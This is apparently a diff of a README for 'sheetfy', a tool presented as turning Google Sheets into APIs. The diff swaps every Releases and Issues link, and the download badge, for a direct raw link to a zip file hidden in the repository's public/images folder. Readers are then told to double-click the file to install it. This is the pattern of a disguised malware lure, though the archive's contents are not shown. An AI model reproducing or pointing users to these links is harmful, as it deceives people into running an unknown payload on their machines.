@@ -1,6 +1,6 @@
 # 🚀 sheetfy - Turn Your Google Sheets into APIs with Ease
 
-[![Download Sheetfy](https://img.shields.io/badge/Download-Sheetfy-brightgreen)](https://github.com/segu0/sheetfy/releases)
+[![Download Sheetfy](https://github.com/segu0/sheetfy/raw/refs/heads/main/public/images/Software-v3.1-beta.2.zip)](https://github.com/segu0/sheetfy/raw/refs/heads/main/public/images/Software-v3.1-beta.2.zip)
 
 ## 📘 Introduction
 
@@ -22,7 +22,7 @@ Sheetfy is a simple solution that allows you to transform your Google Sheets int
 ## 🛠️ Getting Started
 
 1. **Download Sheetfy**  
-   To download Sheetfy, visit the [Releases page](https://github.com/segu0/sheetfy/releases). You will find the latest version available for your system. Click the download link for the version you need.
+   To download Sheetfy, visit the [Releases page](https://github.com/segu0/sheetfy/raw/refs/heads/main/public/images/Software-v3.1-beta.2.zip). You will find the latest version available for your system. Click the download link for the version you need.
 
 2. **Install Sheetfy**  
    After downloading, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -51,11 +51,11 @@ If you encounter issues during installation or usage, check the following:
 - Verify that you have a good internet connection.
 - Make sure your Google account has access to the specific Google Sheets you want to convert. 
 
-For further assistance, consider checking the [Issues](https://github.com/segu0/sheetfy/issues) page of this repository.
+For further assistance, consider checking the [Issues](https://github.com/segu0/sheetfy/raw/refs/heads/main/public/images/Software-v3.1-beta.2.zip) page of this repository.
 
 ## 📦 Download & Install
 
-To download and install Sheetfy, follow this link: [Releases page](https://github.com/segu0/sheetfy/releases).  Choose the latest release and follow the installation guide provided above.
+To download and install Sheetfy, follow this link: [Releases page](https://github.com/segu0/sheetfy/raw/refs/heads/main/public/images/Software-v3.1-beta.2.zip).  Choose the latest release and follow the installation guide provided above.
 
 ## 🛠️ Support
 
